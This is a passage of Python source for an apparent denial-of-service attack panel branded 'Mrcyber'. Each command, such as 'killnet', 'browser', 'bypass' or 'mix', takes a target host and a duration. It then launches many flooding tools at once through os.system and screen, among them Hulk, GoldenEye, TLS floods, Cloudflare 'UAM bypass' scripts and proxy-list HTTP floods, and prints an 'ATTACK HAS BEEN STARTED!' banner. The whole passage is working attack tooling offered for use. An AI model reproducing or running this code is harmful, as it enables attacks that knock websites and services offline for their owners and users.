  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[\033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLS \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bot" or sinput == "BOT":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
          os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
          os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "brutal" or sinput == "BRUTAL":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')				
          os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
          os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tlsv2" or sinput == "TLSV2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 32 5 500')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 32 1')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tlsv3" or sinput == "TLSV3":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')  
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "http" or sinput == "HTTP":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
          os.system(f'cd .malware && screen -dm node HTTP-RAND.js {host} {time}')
          os.system(f'cd .malware && screen -dm node HTTP.js {host} 300 8 {time}')
          os.system(f'cd /media && screen -dm node HTTP.js {host} 300 8 {time}')
          os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bomb2" or sinput == "BOMB2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bomb" or sinput == "BOMB":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run Low.go -site {host} -data GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "golden" or sinput == "GOLDEN":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && python3 goldeneye.py {host} -w 10 -s 500 -m random -d True')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET    : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
  \033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER      : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "https" or sinput == "HTTPS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 8 500')		
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 5 128')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 128')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')	
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "https2" or sinput == "HTTPS2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 500 2')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 500 5')
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 1 {time}')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data GET')
          os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run strike.go -url {host} POST')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "bypass" or sinput == "BYPASS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "mix" or sinput == "MIX":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
          os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 64')
          os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} {time} 10 proxy.txt 64 10')
          os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} {time} 8 1 proxy.txt')
          os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
          os.system(f'cd .SUDANC && screen -dm node OVER6.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
          os.system(f'cd /media && screen -dm node OVER2.js {host} {time} 10 proxy.txt 32 10')
          os.system(f'cd /media && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
          os.system(f'cd /media && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()			    
      elif sinput == "bot2" or sinput == "BOT2":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')	
          os.system(f'cd /media && screen -dm node OVER.js {host} 16 {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBOT2 \033[35m]
  \033[1;37m                LAYER-12 : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()			    
      elif sinput == "browser" or sinput == "BROWSER":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .BF && screen -dm ./BROWSER {host} {time} 64 10')
          os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd .BF && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF2 && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF3 && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF3 && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 3 500')	
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd /media && screen -dm ./BROWSER {host} {time} 64 10')
          os.system(f'cd /media && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd /media && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd /media && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')	
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "killnet" or sinput == "KILLNET":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
          os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
          os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()			    			    
      elif sinput == "uam" or sinput == "UAM":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
